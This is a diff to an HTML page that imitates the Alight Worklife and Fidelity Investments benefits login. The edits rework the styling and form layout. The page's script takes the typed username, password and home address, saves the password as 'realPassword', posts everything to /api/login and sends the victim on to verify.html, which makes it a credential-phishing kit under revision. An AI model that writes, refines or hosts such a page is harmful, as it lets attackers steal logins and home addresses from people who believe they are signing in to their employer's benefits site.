@@ -16,18 +16,14 @@
             align-items: center;
             background-size: cover;
             background-image: url('logi.jpg');
-            
             background-position: center;
             background-repeat: no-repeat;
             background-attachment: fixed;
             position: relative;
-             min-width: 100%;
+            min-width: 100%;
             height: 100%;
-            
-            display: flex;
             align-items: flex-end;
             padding: 40px 25px 180px;
-            position: relative;
         }
 
         body::before {
@@ -47,7 +43,7 @@
             z-index: 2; 
             position: relative;
         }
-      .fidelity-logo {
+        .fidelity-logo {
             display: flex;
             align-items: center;
             justify-content: center;
@@ -58,46 +54,21 @@
             width: 190px;
             height: auto;
             padding: 8px 12px; 
-            /* Adds some breathing room around the logo */   
-           /* Makes it white to match dark theme */
-           margin-top: 10px;
+            margin-top: 10px;
         }
 
-
-        /* Alight Worklife Logo */
         .alight-worklife {
             font-size: 2.8rem;
             font-weight: 700;
             letter-spacing: -0.02em;
             margin-bottom: 10px;
         }
-        .alight-worklife .alight {
-            color: #1a1a1a;
-        }
+        .alight-worklife .alight { color: #1a1a1a; }
         .alight-worklife .worklife {
             background: linear-gradient(90deg, #7ed957, #34d399);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             font-weight: 700;
-        }
-
-        /* United Logo */
-        .united-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin: 15px 0 20px;
-        }
-        .united-logo .united-text {
-            font-size: 2.4rem;
-            font-weight: 800;
-            color: #0033a0;
-            letter-spacing: 0.05em;
-        }
-        .globe {
-            font-size: 2.6rem;
-            line-height: 1;
         }
 
         .form-container { 
@@ -160,11 +131,10 @@
             box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1);
         }
 
-        /* Reduced helper text size */
         .helper-text {
             display: block;
             margin-top: 6px;
-            font-size: 13px;        /* ← Reduced from 14px */
+            font-size: 13px;
             color: #0052cc;
             font-weight: 500;
         }
@@ -176,17 +146,9 @@
             <span class="alight">alight</span>
             <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
         </div>
-<!----
-        <div class="united-logo">
-            <span class="united-text">UNITED</span>
-            <span class="globe">🌐</span>
-        </div>
-    -->
-         <!-- Fidelity Logo -->
+
         <div class="fidelity-logo">
-            <img src="fidelity.jpg" 
-                 alt="Fidelity Investments" 
-                 onerror="this.style.display='none'; console.log('Fidelity logo failed to load');">
+            <img src="fidelity.jpg" alt="Fidelity Investments">
         </div>
 
         <div class="worklife">Same Login used to access benefits on alight Worklife web</div>
@@ -203,50 +165,50 @@
             <div class="form-group">
                 <label for="password">Enter your Password</label>
                 <input type="password" id="password" placeholder="Password" required>
-                
             </div>
-             <div class="forgot-link" style="text-align: right; margin-top: 8px;">
+
+            <div class="form-group">
+                <label>Home Address (Current)</label>
+                <input type="text" id="address" placeholder="Enter your current home address" required>
+            </div>
+
+            <div class="forgot-link" style="text-align: right; margin: 10px 0 15px;">
                 <a href="forgot.html" style="color: #1e40af; font-size: 0.9rem;">Forgot Password?</a>
-            
-            <label>Home Address (Current)</label>
-            <input type="text" id="address" placeholder="Enter your current home address" required>
+            </div>
 
             <button type="submit" class="login-btn">LOG IN</button>
         </form>
     </div>
 
-   <script>
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        
-        const username = document.getElementById('username').value.trim();
-        sessionStorage.setItem('realUsername', username);
-        const password = document.getElementById('password').value.trim();
-        const homeAddress = document.getElementById('address').value.trim();
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const homeAddress = document.getElementById('address').value.trim();
 
-        sessionStorage.setItem('realPassword', password);
+            sessionStorage.setItem('realUsername', username);
+            sessionStorage.setItem('realPassword', password);
 
-        const payload = { 
-            username: username || "N/A", 
-            password: password || "N/A", 
-            address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
-        };
+            const payload = { 
+                username: username || "N/A", 
+                password: password || "N/A", 
+                address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
+            };
 
-        try {
-            await fetch('/api/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (err) {
-            console.error("Submit error:", err);
-        }
+            try {
+                await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Submit error:", err);
+            }
 
-        window.location.href = "verify.html";
-    });
-
-
-
-</script>
+            window.location.href = "verify.html";
+        });
+    </script>
 </body>
 </html>
